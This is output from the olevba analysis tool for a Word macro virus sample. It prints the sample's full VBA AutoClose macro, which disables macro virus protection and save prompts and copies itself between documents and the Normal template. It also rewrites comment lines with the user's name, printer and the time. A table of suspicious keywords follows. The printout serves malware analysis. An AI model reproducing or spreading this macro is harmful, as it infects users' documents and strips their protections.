olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ab0fa92eefea83806f5f65f6125e07bf2522f35c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ab0fa92eefea83806f5f65f6125e07bf2522f35c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
On Error Resume Next
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Options.SaveNormalPrompt = 0
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Options.VirusProtection = 0
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
TD78 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Application.EnableCancelKey = 0
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
TV70 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Options.ConfirmConversions = 0
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Set MU43 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
FD98 = True
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
End If
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Set MU43 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
DG58 = True
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
End If
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
If DG58 <> True And FD98 <> True Then GoTo HS96
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
If DG58 = True Then MU43.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TV70 - 1))
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
If FD98 = True Then MU43.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TD78 - 1))
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
With MU43.CodeModule
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
For x = 2 To (MU43.CodeModule.CountOfLines - 1) Step 2
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
Next x
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
End With
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
HS96:
'TesterT00013330.DOC00013330.DOC2/23/01 6:00:49 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

